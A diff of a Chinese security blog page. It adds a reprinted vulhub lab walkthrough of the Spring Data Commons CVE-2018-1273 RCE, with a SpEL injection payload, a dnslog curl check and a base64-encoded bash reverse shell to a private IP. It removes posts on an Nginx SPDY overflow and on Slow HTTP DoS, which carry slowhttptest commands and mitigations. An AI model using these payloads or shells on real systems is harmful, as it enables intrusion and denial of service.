@@ -86,32 +86,47 @@
 
     
         <h2 class="title">
-            <a href="/2022/08/15/CVE-2014-0133-Nginx/">
-                CVE-2014-0133-Nginx
+            <a href="/2023/10/25/CVE-2018-1273-Spring-Data/">
+                Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）漏洞验证与getshell
             </a>
         </h2>
     
     <time>
-        Aug 15, 2022
+        Oct 25, 2023
     </time>
     <section class="content">
-        <h1><span id="nginx-spdy缓冲区溢出漏洞">Nginx SPDY缓冲区溢出漏洞</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53008479/article/details/124755846">山兔1</a> 并作补充</p>
+        <h1><span id="spring-data-commons-远程命令执行漏洞cve-2018-1273漏洞验证与getshell">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）漏洞验证与getshell</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45300786/article/details/119323425">樱浅沐冰</a> 并作补充</p>
 </blockquote>
-<h2><span id="注意">注意</span></h2><blockquote>
-<p>nginx SPDY实现存在基于堆的缓冲区溢出，允许攻击者利用漏洞提交特殊的请求使应用程序崩溃或执行任意代码。</p>
-<p>如果是漏扫，扫出来的话，是没有用的，它是根据版本来确认nginx是否存在的漏洞的，具体得登陆服务器上看。</p>
+<h2><span id="影响版本">影响版本</span></h2><blockquote>
+<p>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)<br>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)<br>Spring Data Commons 2.0 to 2.0.5 (Kay SR5)<br>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p>
 </blockquote>
-<h2><span id="成因">成因</span></h2><blockquote>
-<p>Nginx 1.3.15 - 1.5.11 的版本都收此漏洞影响，原因是如果<code>listen</code>指令中的<code>spdy</code>选项被配置文件所调用，则编译时会使用<code>ngx_http_spdy_module</code>模块（默认不编译），并且没有<code>--with-debug</code>配置选项。</p>
+<h2><span id="复现过程">复现过程</span></h2><blockquote>
+<p>vulhub<br>详细过程请看<a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/111413971?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162786362316780269821706%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=162786362316780269821706&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-111413971.pc_v2_rank_blog_default&utm_term=CVE-2018-1273&spm=1018.2226.3001.4450">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</a></p>
 </blockquote>
-<h2><span id="修复">修复</span></h2><blockquote>
-<p>此漏洞已在 Nginx 1.5.12 及 1.4.7 后被修复，问题补丁如下：</p>
+<h3><span id="一-验证">一、验证</span></h3><blockquote>
+<p>这里使用dnslog来验证。<br>先获取一个dns地址<br>t15gcx.dnslog.cn<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/1.png" alt="image"> </p>
+<p>拼接命令<br><code>curl </code>whoami<code>.t15gcx.dnslog.cn</code></p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--- src/http/ngx_http_spdy.c</span><br><span class="line">+++ src/http/ngx_http_spdy.c</span><br><span class="line">@@ -1849,7 +1849,7 @@ static u_char *</span><br><span class="line"> ngx_http_spdy_state_save(ngx_http_spdy_connection_t *sc,</span><br><span class="line">     u_char *pos, u_char *end, ngx_http_spdy_handler_pt handler)</span><br><span class="line"> &#123;</span><br><span class="line">-#if (NGX_DEBUG)</span><br><span class="line">+#if 1</span><br><span class="line">     if (end - pos &gt; NGX_SPDY_STATE_BUFFER_SIZE) &#123;</span><br><span class="line">         ngx_log_error(NGX_LOG_ALERT, sc-&gt;connection-&gt;log, 0,</span><br><span class="line">                       &quot;spdy state buffer overflow: &quot;</span><br></pre></td></tr></table></figure>
-
 <blockquote>
-<p>请更新 <a target="_blank" rel="noopener" href="https://nginx.org/en/download.html">Nginx 版本</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a><br>对反弹shell的POC进行base64编码（java反弹shell都需要先编码，不然不会成功，原因貌似是runtime不支持管道符）<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/2.png" alt="image"> </p>
+<p><code>bash -c &#123;echo,Y3VybCBgd2hvYW1pYC50MTVnY3guZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
+</blockquote>
+<h3><span id="exp">Exp</span></h3><blockquote>
+<p>替换对应的payload，重新发送数据包<br>成功反弹回显到dnslog上<br><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash -c &#123;echo,Y3VybCBgd2hvYW1pYC50MTVnY3guZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)]=&amp;password=&amp;repeatedPassword=</code></p>
+<p><img src="/2023/10/25/CVE-2018-1273-Spring-Data/3.png" alt="image"> </p>
+</blockquote>
+<h3><span id="二-反弹shell">二、反弹shell</span></h3><blockquote>
+<p>反弹shell<br><code>bash -i &gt;&amp; /dev/tcp/192.168.100.23/9090 0&gt;&amp;1</code></p>
+</blockquote>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a><br>对反弹shell的POC进行base64编码（java反弹shell都需要先编码，不然不会成功，原因貌似是runtime不支持管道符）<br><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4yMy85MDkwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code><br>监听9090端口<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/4.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>替换掉curlwhoami.t15gcx.dnslog.cn对应的payload，重新发送数据包<br>成功反弹shell<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/5.png" alt="image"> </p>
+</blockquote>
+<h2><span id="参考文章">参考文章</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/111413971?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162786362316780269821706%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=162786362316780269821706&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-111413971.pc_v2_rank_blog_default&utm_term=CVE-2018-1273&spm=1018.2226.3001.4450">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</a><br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/spring/CVE-2018-1273">Vulhub CVE-2018-1273</a></p>
 </blockquote>
 
 
@@ -119,7 +134,7 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
             </div>
         
 
@@ -130,653 +145,59 @@
 
     
         <h2 class="title">
-            <a href="/2022/08/08/Slow-HTTP-Dos/">
-                Slow HTTP Dos
+            <a href="/2023/10/25/kswapd0-CPU-1/">
+                服务器（Linux）挖矿木马病毒（kswapd0进程使cpu爆满）
             </a>
         </h2>
     
     <time>
-        Aug 8, 2022
+        Oct 25, 2023
     </time>
     <section class="content">
-        <h1><span id="http慢速拒绝服务攻击slow-http-dos">HTTP慢速拒绝服务攻击（Slow HTTP Dos）</span></h1><blockquote>
-<p>本文摘自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/13409171.html">春告鳥</a>及<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/285282.html">libaisec</a></p>
-</blockquote>
-<h2><span id="http慢速拒绝服务攻击简介">HTTP慢速拒绝服务攻击简介</span></h2><blockquote>
-<p>HTTP慢速攻击是利用HTTP合法机制，以极低的速度往服务器发送HTTP请求，尽量长时间保持连接，不释放，若是达到了Web Server对于并发连接数的上限，同时恶意占用的连接没有被释放，那么服务器端将无法接受新的请求，导致拒绝服务。</p>
-</blockquote>
-<h2><span id="http慢速攻击原理摘抄自倾旋师傅的博客httpspayloadsonlinearchivers2018-04-162">HTTP慢速攻击原理（摘抄自倾旋师傅的博客:</span></h2><blockquote>
-<p>既然是一个HTTP协议的缓慢攻击，这就要从HTTP协议说起了。</p>
-<p>首先HTTP协议的报文都是一行一行的，类似于：</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host : payloads.online\r\n</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Keep-Alive: <span class="number">900</span>\r\n</span><br><span class="line">Content-Length: <span class="number">100000000</span>\r\n</span><br><span class="line">Content_Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Accept: *.*\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>那么报文中的\r\n是什么？</p>
-<p>\r\n代表一行报文的结束也被称为空行（CRLF），而\r\n\r\n代表整个报文的结束</p>
-<p>从上面贴出的GET请求包可以看出，我们的客户端请求到服务器后，告知服务器这个连接需要保留。</p>
-<p>通常我们知道HTTP协议采用“请求-应答”模式，当使用普通模式，即非KeepAlive模式时，每个请求&#x2F;应答客户和服务器都要新建一个连接，完成之后立即断开连接（HTTP协议为无连接的协议）；当使用Keep-Alive模式（又称持久连接、连接重用）时，Keep-Alive功能使客户端到服 务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive功能避免了建立或者重新建立连接。</p>
-<p>那么当我们客户端发送一个报文，不以CRLF结尾，而是10s发送一行报文，我们的报文需要80s才能发送完毕，这80s内，服务器需要一直等待客户端的CRLF，然后才能解析这个报文。</p>
-<p>如果客户端使用更多的程序发送这样的报文，那么服务器端会给客户端留出更多的资源来处理、等待这迟迟不传完的报文。假设服务器端的客户端最大连接数是100个，我们使用测试程序先连接上100次服务器端，并且报文中启用Keep-Alive，那么其他正常用户101、102就无法正常访问网站了。</p>
-<p>简单来说，就是我们每次只发一行，每次发送之间的间隔时间很长，这迟迟未发送结束的HTTP包会占用服务端的资源，当达到服务端处理请求的上限时，这时候再用户对网站正常请求，服务端也处理不了了，导致了拒绝服务。</p>
-</blockquote>
-<h2><span id="http慢速攻击分类">HTTP慢速攻击分类</span></h2><blockquote>
-<p>HTTP慢速攻击分为三类：</p>
-<ul>
-<li>Slow headers</li>
-<li>Slow body</li>
-<li>Slow read</li>
-</ul>
-</blockquote>
-<h3><span id="1slow-headers">1，Slow headers</span></h3><blockquote>
-<p>第一类是最经典的HTTP Slow慢速攻击，由rsnake发明的，原理在上面已介绍。</p>
-</blockquote>
-<h3><span id="2slow-body">2，Slow body</span></h3><blockquote>
-<p>第二类也叫做Slow HTTP POST</p>
-<p>原理为在POST提交方式中，允许在HTTP的头中声明content-length，即POST内容的长度。</p>
-<p>提交了恶意头之后，将需要传输的body缓慢进行发送，跟Slow headers类似，导致服务器端长时间等待需要传输的POST数据，当请求的数量变多后，达到了消耗服务器资源的效果，导致服务器宕机。</p>
-</blockquote>
-<h3><span id="3slow-read-attack">3，Slow Read attack</span></h3><blockquote>
-<p>第三类攻击方式采用调整TCP协议中滑动窗口大小，来对服务器单次发送的数据大小进行控制，使得服务器需要对一个相应包分为很多个包来发送，想要使这种攻击效果明显，请求的资源要尽量大，这里很容易理解，当请求的资源越大，返回包才越大，这样才能分成更多的包让服务器发送，导致拒绝服务的产生。</p>
-<p>也就是说，客户端以极低的速度来读取返回包，来消耗服务器的连接和内存资源。</p>
-</blockquote>
-<h2><span id="http慢速攻击实战">HTTP慢速攻击实战</span></h2><blockquote>
-<p>一般使用slowhttptest工具（安装方式很多，不再赘述）</p>
-</blockquote>
-<h3><span id="工具简介">工具简介</span></h3><blockquote>
-<p>SlowHTTPTest是一个可配置的应用层拒绝服务攻击测试工具，它可以工作在Linux，OSX和Cygwin环境以及Windows命令行接口，可以帮助安全测试人员检验服务器对慢速攻击的处理能力。</p>
-<p>这个工具可以模拟低带宽耗费下的DoS攻击，比如慢速攻击，慢速HTTP POST，通过并发连接池进行的慢速读攻击（基于TCP持久时间）等。慢速攻击基于HTTP协议，通过精心的设计和构造，这种特殊的请求包会造成服务器延时，而当服务器负载能力消耗过大即会导致拒绝服务。</p>
-</blockquote>
-<h3><span id="使用参数介绍">使用参数介绍</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">测试模式:</span><br><span class="line">-H                            slow header,slowloris默认采用此模式          </span><br><span class="line">-B                            slow body</span><br><span class="line">-R                            远程攻击又名Apache killer</span><br><span class="line">-X                            slow <span class="built_in">read</span></span><br><span class="line">​</span><br><span class="line">报告选项：</span><br><span class="line">-g                            生成具有套接字状态更改的统计信息（默认关闭）</span><br><span class="line">-o file_prefix                将统计信息输出保存在file.html和file.csv中（需要-g）</span><br><span class="line">-v level                      日志信息，详细级别0-4：致命，信息，错误，警告，调试</span><br><span class="line">​</span><br><span class="line">常规选项：</span><br><span class="line">-c connections                连接目标连接数（50）</span><br><span class="line">-i seconds                    后续数据之间的间隔（以秒为单位）（10）</span><br><span class="line">-l seconds                    测试目标时间长度，以秒为单位（240）</span><br><span class="line">-r rate                       每秒连接数（50）</span><br><span class="line">-s                            如果需要，Content-Length标头的值（4096）</span><br><span class="line">-t                            在请求中使用的动词，对于slow header和response，默认为GET；对于slow body，默认为POST</span><br><span class="line">-u URL                        目标的绝对URL（http://localhost/）</span><br><span class="line">-x                            在slowloris and Slow POST tests模式中，指定发送的最大数据长度</span><br><span class="line">-f                            Content-Type标头的值（application/x-www-form-urlencoded）</span><br><span class="line">-m                            接受(Accept)标头的值（text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5）</span><br><span class="line">​</span><br><span class="line">探测/代理选项：</span><br><span class="line">-d host:port                  为所有连接指定代理</span><br><span class="line">-e host:port                  为探测连接指定代理</span><br><span class="line">-p seconds                    指定等待时间来确认DoS攻击已经成功</span><br><span class="line">​</span><br><span class="line">range attack特定选项：</span><br><span class="line">-a                            标头中的起始位置</span><br><span class="line">-b                            标头中的结束位置</span><br><span class="line">​</span><br><span class="line">slow <span class="built_in">read</span>特定选项：</span><br><span class="line">-k                            在连接中重复相同请求的次数。如果服务器支持永久连接，则用于成倍增加响应大小。</span><br><span class="line">-n                            从recv缓冲区读取操作之间的时间间隔，以秒为单位（1）</span><br><span class="line">-w                            slow <span class="built_in">read</span>模式中指定tcp窗口范围下限</span><br><span class="line">-y                            slow <span class="built_in">read</span>模式中指定tcp窗口范围上限</span><br><span class="line">-z                            在每次的<span class="built_in">read</span>中，从buffer中读取数据量</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>对于三种类型的慢速攻击，分别给出payload：（摘抄的！）</p>
-</blockquote>
-<h3><span id="slow-header">Slow Header</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -H -i 10 -r 200 -s 8192 -t SLOWHEADER -u http://vulurl.com</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>该攻击会像我们刚才讲的慢速传递HTTP报文，占用服务器资源让其等待我们最后的CRLF。</p>
-</blockquote>
-<h3><span id="slow-read">Slow Read</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -X -r 1000 -w 10 -y 20 -t SLOWREAD -n 5 -z 32 -u http://vulurl.com</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>该攻击会在Web服务器响应内容传输回来的时候，我们客户端缓慢的读取响应报文，这样服务器端也会一直等待客户端来接收完毕。</p>
-</blockquote>
-<h3><span id="slow-post">Slow Post</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -B -i 10 -r 200 -s 8192 -t SLOWBODY -u http://vulurl.com</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>该攻击会构造一个POST数据包，将数据缓慢传输，使服务器端一直等待接收报文。</p>
-<p>找一个存在漏洞的网址进行检测：</p>
-<p>使用Slow Post的payload：（漏洞网址已高码）</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -B -i 10 -r 200 -s 8192 -t SLOWBODY -u https://xxxxxx</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2022/08/08/Slow-HTTP-Dos/1.png" alt="image"></p>
-<p>当显示为NO，则表示存在HTTP慢速攻击漏洞，可导致拒绝服务。</p>
-</blockquote>
-<h2><span id="解决办法">解决办法</span></h2><blockquote>
-<p>针对不同的Server其对慢速http拒绝服务攻击防范方法也不同：</p>
-</blockquote>
-<h3><span id="websphere">WebSphere</span></h3><blockquote>
-<p>1、限制 HTTP 数据的大小</p>
-<p>在WebSphere Application Server 中进行如下设置：</p>
-<p>任何单个 HTTP 头的默认最大大小为 32768 字节。可以将它设置为不同的值。</p>
-<p>HTTP 头的默认最大数量为 50。可以将它设置为不同的限制值。</p>
-<p>另一种常见的 DOS 攻击是发送一个请求，这个请求会导致一个长期运行的 GET 请求。WebSphere Application Server Plug-in 中的 ServerIOTimeoutRetry 属性可限制任何请求的重试数量。这可以降低这种长期运行的请求的影响。</p>
-<p>设置限制任何请求正文的最大大小。</p>
-</blockquote>
-<blockquote>
-<p>2、设置keepalive参数</p>
-<p>打开ibm http server安装目录，打开文件夹conf，打开文件httpd.conf,查找KeepAlive值，改ON为OFF,其默认为ON。</p>
-<p>这个值说明是否保持客户与HTTP SERVER的连接，如果设置为ON，则请求数到达MaxKeepAliveRequests设定值时请求将排队，导致响应变慢。</p>
-</blockquote>
-<blockquote>
-<p>详见<a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/cn/websphere/techjournal/1210_lansche/1210_lansche.html#new-step32">参考链接</a></p>
-</blockquote>
-<h3><span id="weblogic">Weblogic</span></h3><blockquote>
-<p>1、在配置管理界面中的协议-&gt;一般信息下设置 完成消息超时时间小于200</p>
-</blockquote>
-<blockquote>
-<p>2、在配置管理界面中的协议-&gt;HTTP下设置 POST 超时、持续时间、最大 POST 大小为安全值范围。</p>
-</blockquote>
-<blockquote>
-<p>详见<a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/E12890_01/ales/docs32/integrateappenviron/configWLS.html#wp1101063">参考链接</a></p>
-</blockquote>
-<h3><span id="nginx">Nginx</span></h3><blockquote>
-<p>1、通过调整$request_method，配置服务器接受http包的操作限制；</p>
-</blockquote>
-<blockquote>
-<p>2、在保证业务不受影响的前提下，调整</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">client_max_body_size</span><br><span class="line">client_body_buffer_size</span><br><span class="line">client_header_buffer_size</span><br><span class="line">large_client_header_buffersclient_body_timeout</span><br><span class="line">client_header_timeout</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>的值，必要时可以适当的增加；</p>
-</blockquote>
-<blockquote>
-<p>3、对于会话或者相同的ip地址，可以使用HttpLimitReqModule and HttpLimitZoneModule参数去限制请求量或者并发连接数；</p>
-</blockquote>
-<blockquote>
-<p>4、根据CPU和负载的大小，来配置worker_processes 和 worker_connections的值，公式是：max_clients &#x3D; worker_processes * worker_connections。</p>
-</blockquote>
-<h3><span id="apache">Apache</span></h3><blockquote>
-<p>建议使用mod_reqtimeout和mod_qos两个模块相互配合来防护。</p>
-</blockquote>
-<blockquote>
-<p>1、mod_reqtimeout用于控制每个连接上请求发送的速率。配置例如：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#请求头部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slowloris型的慢速攻击。</span></span><br><span class="line"></span><br><span class="line">RequestReadTimeout header=10-40,minrate=500</span><br><span class="line"></span><br><span class="line"><span class="comment">#请求正文部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slow message body型的慢速攻击。</span></span><br><span class="line"></span><br><span class="line">RequestReadTimeout body=10-40,minrate=500</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>需注意，对于HTTPS站点，需要把初始超时时间上调，比如调整到20秒。<br>示例：</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoadModule reqtimeout_module modules/mod_reqtimeout.so</span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">reqtimeout_module</span>&gt;</span></span><br><span class="line">        RequestReadTimeout header=10-40,minrate=500 body=10-40,minrate=500</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>2、mod_qos用于控制并发连接数。配置例如：</p>
-<p>当服务器并发连接数超过600时，关闭keepalive<br><code>QS_SrvMaxConnClose 600</code></p>
-<p>限制每个源IP最大并发连接数为50<br><code>QS_SrvMaxConnPerIP 50</code><br>这两个数值可以根据服务器的性能调整。</p>
-</blockquote>
-<blockquote>
-<p>更多关于qos_module配置<a target="_blank" rel="noopener" href="http://mod-qos.sourceforge.net/dos.html">参考</a><br>示例：</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LoadModule qos_module modules/mod_qos.so</span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">qos_module</span>&gt;</span></span><br><span class="line">QS_SrvMaxConnClose 600</span><br><span class="line">QS_SrvMaxConnPerIP 50</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3><span id="ihs服务器">IHS服务器</span></h3><blockquote>
-<p>请您先安装最新补丁包，然后启用mod_reqtimeout模块，在配置文件中加入：<br><code>LoadModule reqtimeout_module modules/mod_reqtimeout.so</code></p>
-</blockquote>
-<blockquote>
-<p>为mod_reqtimeout模块添加配置：</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_reqtimeout.c</span>&gt;</span></span><br><span class="line">RequestReadTimeout header=10-40,MinRate=500 body=10-40,MinRate=500</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>对于HTTPS站点，建议header&#x3D;20-40,MinRate&#x3D;500。</p>
-</blockquote>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://www-01.ibm.com/support/docview.wss?uid=swg21652165">参见</a></p>
-</blockquote>
-<h3><span id="f5负载均衡">F5负载均衡</span></h3><blockquote>
-<p>F5负载均衡设备有相应的防护模块，如无购买可参考附件中的详细配置过程。<br>关于F5的慢速攻击防护配置，请参考<a target="_blank" rel="noopener" href="https://support.f5.com/kb/en-us/solutions/public/10000/200/sol10260.html">Page1</a>,<a target="_blank" rel="noopener" href="https://devcentral.f5.com/articles/mitigating-slow-http-post-ddos-attacks-with-irules-ndash-follow-up">Page2</a></p>
-</blockquote>
-<h3><span id="iis服务器">IIS服务器</span></h3><blockquote>
-<p>IIS可配置相关网站的Web.config如下：</p>
-</blockquote>
-<blockquote>
-<p>1、WebLimits设置：</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.applicationHost</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">webLimits</span> <span class="attr">connectionTimeout</span>=<span class="string">&quot;00:00:30&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">headerWaitTimeout</span>=<span class="string">&quot;00:00:10&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">dynamicIdleThreshold</span>=<span class="string">&quot;150&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">minBytesPerSecond</span>=<span class="string">&quot;512&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.applicationHost</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>参考以下<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/weblimits#configuration">链接</a></p>
-</blockquote>
-<blockquote>
-<p>2、headerLimits设置：</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">security</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">requestFiltering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">requestLimits</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">headerLimits</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">add</span> <span class="attr">header</span>=<span class="string">&quot;Content-type&quot;</span> <span class="attr">sizeLimit</span>=<span class="string">&quot;100&quot;</span> /&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">headerLimits</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">requestLimits</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">requestFiltering</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">security</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/iis/configuration/system.webserver/security/requestfiltering/requestlimits/headerlimits/">参考</a></p>
-</blockquote>
-<h2><span id="参考链接">参考链接：</span></h2><blockquote>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2018-04-16/2">https://payloads.online/archivers/2018-04-16/2</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.f4guo.top/2019/10/09/HTTP%E6%85%A2%E9%80%9F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/">https://www.f4guo.top/2019/10/09/HTTP%E6%85%A2%E9%80%9F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</a></li>
